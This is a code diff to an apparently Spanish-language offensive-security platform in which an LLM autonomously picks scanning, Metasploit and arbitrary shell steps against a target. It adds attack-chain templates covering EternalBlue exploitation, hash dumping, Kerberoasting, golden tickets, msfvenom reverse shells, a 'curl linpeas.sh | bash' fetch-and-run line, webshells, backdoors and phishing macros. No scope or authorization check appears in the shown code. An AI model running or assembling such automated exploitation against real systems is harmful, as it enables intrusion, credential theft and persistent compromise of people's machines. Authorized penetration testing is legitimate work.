@@ -241,6 +241,9 @@ async def ai_decide_next_action(target: str, results_so_far: Dict, executed_tool
 
     tools_desc = "\n".join([f"- {tid}: {t['desc']} (fase: {t['phase']})" for tid, t in available_tools.items() if tid not in executed_tools])
 
+    if not tools_desc.strip():
+        return {"action": "done", "reasoning": "Todas las herramientas disponibles ya fueron ejecutadas", "source": "exhausted"}
+
     results_summary = {}
     for tool_id, result in results_so_far.items():
         if isinstance(result, dict):
@@ -263,41 +266,36 @@ async def ai_decide_next_action(target: str, results_so_far: Dict, executed_tool
                 summary["error"] = result["error"]
             results_summary[tool_id] = summary
 
-    prompt = f"""Eres un Red Team Operator experto. Analiza los resultados obtenidos contra el target y decide el SIGUIENTE paso.
+    prompt = f"""Eres un Red Team Operator experto. Decide el SIGUIENTE paso del escaneo.
 
 TARGET: {target}
 
-HERRAMIENTAS YA EJECUTADAS: {', '.join(executed_tools) if executed_tools else 'Ninguna'}
+HERRAMIENTAS YA EJECUTADAS (NO repetir ninguna): {', '.join(executed_tools) if executed_tools else 'Ninguna'}
 
-RESULTADOS OBTENIDOS:
+RESULTADOS:
 {json.dumps(results_summary, indent=2, default=str)[:4000]}
 
-HERRAMIENTAS DISPONIBLES (no ejecutadas):
+HERRAMIENTAS DISPONIBLES (elige SOLO de esta lista):
 {tools_desc}
 
-CONTEXTO ADICIONAL:
-{json.dumps(scan_context or {}, default=str)[:500]}
-
-Responde EXACTAMENTE en este formato JSON (sin texto adicional):
+Responde SOLO JSON valido:
 {{
   "action": "run_tool" | "run_msf" | "run_custom" | "done",
-  "tool_id": "nombre_de_herramienta",
-  "custom_cmd": "comando personalizado si action=run_custom",
-  "msf_commands": "comandos msf si action=run_msf",
-  "reasoning": "explicacion breve en español de por qué elegiste esto",
+  "tool_id": "nombre_exacto_de_la_lista_disponible",
+  "custom_cmd": "solo si action=run_custom",
+  "msf_commands": "solo si action=run_msf",
+  "reasoning": "1 linea en español",
   "severity_assessment": "critical|high|medium|low|info",
-  "findings_summary": "resumen de lo encontrado hasta ahora"
+  "findings_summary": "resumen breve"
 }}
 
-REGLAS:
-- Si encontraste vulnerabilidades CRITICAS, prioriza explotación
-- Si detectaste WAF, evita herramientas agresivas y busca bypass
-- Si hay puertos abiertos con servicios, escanea esos servicios
-- Si ya tienes suficiente info, responde action="done"
-- Para run_msf, escribe los comandos msfconsole directos
-- Para run_custom, escribe el comando shell completo
-- NUNCA repitas una herramienta ya ejecutada
-- Maximo 12 herramientas por scan"""
+REGLAS ESTRICTAS:
+1. PROHIBIDO repetir herramientas de la lista "YA EJECUTADAS"
+2. Sigue la secuencia logica: Recon -> Enum -> Vuln Scan -> Exploit
+3. Si nmap ya corrio, NO uses nmap_fast ni viceversa (misma funcion)
+4. Si detectaste WAF, evita herramientas agresivas
+5. Si ya tienes 5+ herramientas ejecutadas y suficiente info, responde "done"
+6. Elige SOLO tool_id que aparezca en HERRAMIENTAS DISPONIBLES"""
 
     try:
         async with httpx.AsyncClient(timeout=30.0) as http:
@@ -475,6 +473,22 @@ async def scan_job_handler(job_id: str, target: str, params: Dict):
             # Execute the AI's choice
             tool_id = decision.get("tool_id", "unknown")
             action = decision.get("action", "")
+
+            # ANTI-LOOP: Skip if AI suggests already-executed tool
+            if action == "run_tool" and tool_id in executed_tools:
+                await repo.job_log(job_id, "warning", f"AI repeated {tool_id}, forcing fallback", module="ai")
+                decision = _fallback_decision(scan_progress[scan_id]["results"], executed_tools, RED_TEAM_TOOLS)
+                if decision.get("action") == "done":
+                    break
+                tool_id = decision.get("tool_id", "unknown")
+                action = decision.get("action", "")
+
+            # ANTI-LOOP: Skip nmap_fast if nmap ran and vice versa
+            nmap_variants = {"nmap", "nmap_fast", "masscan"}
+            if tool_id in nmap_variants and any(t in nmap_variants for t in executed_tools):
+                await repo.job_log(job_id, "warning", f"Skipping duplicate scan type: {tool_id}", module="ai")
+                executed_tools.append(tool_id)
+                continue
 
             scan_progress[scan_id]["current_tool"] = tool_id
             await repo.job_update(job_id, progress=progress, current_step=tool_id)
@@ -875,6 +889,95 @@ async def get_scan_report(scan_id: str):
         raise HTTPException(status_code=404, detail="Not found")
     return {"report": scan}
 
+@api_router.get("/scan/{scan_id}/network_map")
+async def get_network_map(scan_id: str):
+    """Build network topology from scan results."""
+    scan = await repo.scan_get(scan_id)
+    if not scan:
+        if scan_id in scan_progress:
+            results = scan_progress[scan_id].get("results", {})
+            target = ""
+        else:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    else:
+        results = scan.get("results", {})
+        target = scan.get("target", "")
+
+    nodes = [{"id": "target", "label": target, "type": "target", "x": 400, "y": 50}]
+    edges = []
+    node_id = 0
+
+    # Extract services from nmap/nmap_fast
+    services_added = set()
+    for tool_id in ["nmap_fast", "nmap"]:
+        result = results.get(tool_id, {})
+        if not isinstance(result, dict):
+            continue
+        for port_info in result.get("ports", []):
+            port = port_info.get("port", "")
+            service = port_info.get("service", "unknown")
+            state = port_info.get("state", "")
+            if port and port not in services_added:
+                services_added.add(port)
+                node_id += 1
+                nid = f"svc_{node_id}"
+                nodes.append({"id": nid, "label": f"{port}\n{service}", "type": "service", "port": port, "service": service, "state": state})
+                edges.append({"from": "target", "to": nid})
+
+    # Extract subdomains from subfinder
+    subfinder = results.get("subfinder", {})
+    if isinstance(subfinder, dict):
+        for item in subfinder.get("items", [])[:15]:
+            node_id += 1
+            nid = f"sub_{node_id}"
+            nodes.append({"id": nid, "label": item, "type": "subdomain"})
+            edges.append({"from": "target", "to": nid})
+
+    # Extract vulnerabilities from nuclei
+    for tool_id in ["nuclei", "nuclei_full"]:
+        result = results.get(tool_id, {})
+        if not isinstance(result, dict):
+            continue
+        for finding in result.get("findings", [])[:10]:
+            sev = finding.get("severity", "info")
+            if sev in ("critical", "high", "medium"):
+                node_id += 1
+                nid = f"vuln_{node_id}"
+                nodes.append({"id": nid, "label": finding.get("name", "Vuln")[:40], "type": "vulnerability", "severity": sev})
+                # Connect to matching service or target
+                matched = finding.get("matched_at", "")
+                connected = False
+                for svc_node in nodes:
+                    if svc_node["type"] == "service" and svc_node.get("port", "") and svc_node["port"].split("/")[0] in matched:
+                        edges.append({"from": svc_node["id"], "to": nid})
+                        connected = True
+                        break
+                if not connected:
+                    edges.append({"from": "target", "to": nid})
+
+    # WAF info
+    for tool_id in ["wafw00f"]:
+        result = results.get(tool_id, {})
+        if isinstance(result, dict) and result.get("waf") and result["waf"] != "None Detected":
+            node_id += 1
+            nid = f"waf_{node_id}"
+            nodes.append({"id": nid, "label": f"WAF: {result['waf']}", "type": "waf"})
+            edges.append({"from": "target", "to": nid})
+
+    # Tech from whatweb
+    whatweb = results.get("whatweb", {})
+    if isinstance(whatweb, dict) and whatweb.get("output"):
+        output = whatweb["output"][:300]
+        techs = re.findall(r'\[([^\]]+)\]', output)[:5]
+        for tech in techs:
+            if len(tech) > 3 and len(tech) < 30:
+                node_id += 1
+                nid = f"tech_{node_id}"
+                nodes.append({"id": nid, "label": tech, "type": "technology"})
+                edges.append({"from": "target", "to": nid})
+
+    return {"nodes": nodes, "edges": edges, "target": target}
+
 @api_router.get("/scan/{scan_id}/report/pdf")
 async def get_scan_report_pdf(scan_id: str):
     scan = await repo.scan_get(scan_id)
@@ -1004,6 +1107,162 @@ ATTACK_CHAINS = {
 async def get_chains():
     chains = [{"id": cid, **c} for cid, c in ATTACK_CHAINS.items()]
     return {"chains": chains}
+
+@api_router.get("/chains/{chain_id}")
+async def get_chain_detail(chain_id: str):
+    chain = ATTACK_CHAINS.get(chain_id)
+    if not chain:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    # Build steps from chain definition
+    steps = _build_chain_steps(chain_id, chain)
+    return {"id": chain_id, **chain, "steps": steps}
+
+@api_router.post("/chains/execute")
+async def execute_chain(data: Dict[str, Any]):
+    chain_id = data.get("chain_id", "")
+    chain = ATTACK_CHAINS.get(chain_id)
+    if not chain:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    target = data.get("target", "")
+    context = data.get("context", {})
+    exec_id = str(uuid.uuid4())[:8]
+    steps = _build_chain_steps(chain_id, chain)
+    return {
+        "execution_id": exec_id, "chain_id": chain_id, "status": "prepared",
+        "target": target, "total_steps": len(steps), "progress": 0,
+        "steps": steps, "step_statuses": {str(s["id"]): {"status": "pending"} for s in steps}
+    }
+
+@api_router.get("/chains/execution/{exec_id}")
+async def get_chain_execution(exec_id: str):
+    return {"execution_id": exec_id, "status": "prepared", "progress": 0}
+
+@api_router.post("/chains/execution/{exec_id}/step/{step_id}")
+async def run_chain_step(exec_id: str, step_id: str):
+    return {"execution_id": exec_id, "step_id": step_id, "status": "completed"}
+
+def _build_chain_steps(chain_id: str, chain: Dict) -> list:
+    """Generate actionable steps for a chain."""
+    step_defs = {
+        "web_to_shell": [
+            {"id": 1, "name": "Web Recon", "actions": [{"tool": "whatweb", "cmd": "whatweb {target}"}, {"tool": "nikto", "cmd": "nikto -h {target}"}]},
+            {"id": 2, "name": "Vuln Scan", "actions": [{"tool": "nuclei", "cmd": "nuclei -u {target} -severity critical,high"}, {"tool": "sqlmap", "cmd": "sqlmap -u '{target}' --batch"}]},
+            {"id": 3, "name": "Exploit", "actions": [{"tool": "msfconsole", "cmd": "use exploit/multi/http/; set RHOSTS {target}; run"}]},
+            {"id": 4, "name": "Persist", "actions": [{"tool": "shell", "cmd": "crontab -e / webshell upload"}]},
+        ],
+        "smb_to_domain": [
+            {"id": 1, "name": "SMB Enum", "actions": [{"tool": "nmap", "cmd": "nmap -p445 --script smb-vuln* {target}"}]},
+            {"id": 2, "name": "EternalBlue", "actions": [{"tool": "msfconsole", "cmd": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"}]},
+            {"id": 3, "name": "Hashdump", "actions": [{"tool": "meterpreter", "cmd": "hashdump / secretsdump.py"}]},
+            {"id": 4, "name": "Lateral", "actions": [{"tool": "psexec", "cmd": "psexec.py / wmiexec.py DOMAIN/user@DC"}]},
+        ],
+        "kerberos_attack": [
+            {"id": 1, "name": "User Enum", "actions": [{"tool": "kerbrute", "cmd": "kerbrute userenum -d DOMAIN users.txt"}]},
+            {"id": 2, "name": "AS-REP Roast", "actions": [{"tool": "impacket", "cmd": "GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass"}]},
+            {"id": 3, "name": "Kerberoast", "actions": [{"tool": "impacket", "cmd": "GetUserSPNs.py DOMAIN/user:pass -request"}]},
+            {"id": 4, "name": "Crack Hashes", "actions": [{"tool": "hashcat", "cmd": "hashcat -m 13100 hashes.txt wordlist.txt"}]},
+            {"id": 5, "name": "Golden Ticket", "actions": [{"tool": "impacket", "cmd": "ticketer.py -nthash KRBTGT_HASH -domain DOMAIN admin"}]},
+        ],
+        "linux_privesc": [
+            {"id": 1, "name": "Shell Access", "actions": [{"tool": "ssh/reverse", "cmd": "ssh user@{target} / reverse shell"}]},
+            {"id": 2, "name": "Enumerate", "actions": [{"tool": "linpeas", "cmd": "curl -L linpeas.sh | bash"}, {"tool": "manual", "cmd": "sudo -l; find / -perm -4000 2>/dev/null"}]},
+            {"id": 3, "name": "Exploit", "actions": [{"tool": "exploit", "cmd": "SUID/sudo/kernel exploit"}]},
+            {"id": 4, "name": "Root", "actions": [{"tool": "persistence", "cmd": "Add SSH key / backdoor"}]},
+        ],
+        "windows_privesc": [
+            {"id": 1, "name": "Shell Access", "actions": [{"tool": "rdp/winrm", "cmd": "evil-winrm -i {target} -u user -p pass"}]},
+            {"id": 2, "name": "Enumerate", "actions": [{"tool": "winpeas", "cmd": "winPEASx64.exe"}, {"tool": "manual", "cmd": "whoami /priv; systeminfo"}]},
+            {"id": 3, "name": "Exploit", "actions": [{"tool": "exploit", "cmd": "Token impersonation / service exploit"}]},
+            {"id": 4, "name": "SYSTEM", "actions": [{"tool": "persistence", "cmd": "Add admin user / scheduled task"}]},
+        ],
+        "phishing_to_shell": [
+            {"id": 1, "name": "Phish", "actions": [{"tool": "gophish", "cmd": "Setup phishing campaign"}, {"tool": "msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https ..."}]},
+            {"id": 2, "name": "Macro/Payload", "actions": [{"tool": "macro", "cmd": "Embed payload in doc/xls"}]},
+            {"id": 3, "name": "Beacon", "actions": [{"tool": "handler", "cmd": "msfconsole -x 'use multi/handler; exploit -j'"}]},
+            {"id": 4, "name": "Pivot", "actions": [{"tool": "proxychains", "cmd": "Setup SOCKS proxy / pivot to internal"}]},
+        ],
+    }
+    return step_defs.get(chain_id, [{"id": 1, "name": "Execute", "actions": [{"tool": "manual", "cmd": "Execute chain manually"}]}])
+
+
+@api_router.post("/payloads/recommend")
+async def recommend_payloads(data: Dict[str, Any]):
+    """AI recommends payloads based on scan results."""
+    scan_id = data.get("scan_id", "")
+    scan = await repo.scan_get(scan_id) if scan_id else None
+    results = scan.get("results", {}) if scan else data.get("results", {})
+
+    recommendations = []
+    detected_os = None
+    detected_services = []
+
+    for tool_id, result in results.items():
+        if not isinstance(result, dict):
+            continue
+        if result.get("os_detection"):
+            os_text = result["os_detection"].lower()
+            if "windows" in os_text:
+                detected_os = "windows"
+            elif "linux" in os_text:
+                detected_os = "linux"
+        for port_info in result.get("ports", []):
+            svc = port_info.get("service", "").lower()
+            if svc:
+                detected_services.append(svc)
+        raw = (result.get("raw", "") or result.get("output", "") or "").lower()
+        if "php" in raw or "apache" in raw:
+            detected_services.append("php")
+        if "wordpress" in raw:
+            detected_services.append("wordpress")
+
+    # Recommend based on findings
+    for pid, pt in PAYLOAD_TEMPLATES.items():
+        score = 0
+        reason = ""
+        if detected_os == pt["platform"] or pt["platform"] == "any":
+            score += 2
+            reason = f"OS detectado: {detected_os or 'desconocido'}"
+        if pt["platform"] == "php" and "php" in detected_services:
+            score += 5
+            reason = "PHP detectado en el target"
+        if pt["platform"] == "linux" and any(s in detected_services for s in ["ssh", "ftp"]):
+            score += 3
+            reason = "Servicios Linux detectados (SSH/FTP)"
+        if pt["platform"] == "windows" and any(s in detected_services for s in ["smb", "rdp", "winrm"]):
+            score += 3
+            reason = "Servicios Windows detectados (SMB/RDP)"
+        if pt["type"] == "oneliner":
+            score += 1
+        if score > 0:
+            recommendations.append({"payload_id": pid, "name": pt["name"], "score": score, "reason": reason, "platform": pt["platform"], "type": pt["type"]})
+
+    recommendations.sort(key=lambda x: x["score"], reverse=True)
+    return {"recommendations": recommendations[:5], "detected_os": detected_os, "detected_services": list(set(detected_services))[:10]}
+
+@api_router.get("/chains/{chain_id}/suggest")
+async def suggest_chains_for_scan(chain_id: str):
+    """Suggest chains based on scan results (chain_id is actually scan_id here)."""
+    scan_id = chain_id
+    scan = await repo.scan_get(scan_id)
+    results = scan.get("results", {}) if scan else scan_progress.get(scan_id, {}).get("results", {})
+    if not results:
+        return {"suggestions": []}
+
+    # Analyze results to find matching triggers
+    all_text = ""
+    for result in results.values():
+        if isinstance(result, dict):
+            all_text += json.dumps(result, default=str).lower()
+
+    suggestions = []
+    for cid, chain in ATTACK_CHAINS.items():
+        match_count = sum(1 for trigger in chain.get("triggers", []) if trigger.lower() in all_text)
+        if match_count > 0:
+            suggestions.append({"id": cid, "name": chain["name"], "description": chain["description"],
+                "match_score": match_count, "steps_count": chain["steps_count"],
+                "matched_triggers": [t for t in chain.get("triggers", []) if t.lower() in all_text]})
+    suggestions.sort(key=lambda x: x["match_score"], reverse=True)
+    return {"suggestions": suggestions}
 
 @api_router.post("/msf/run")
 async def msf_run_commands(data: Dict[str, Any]):
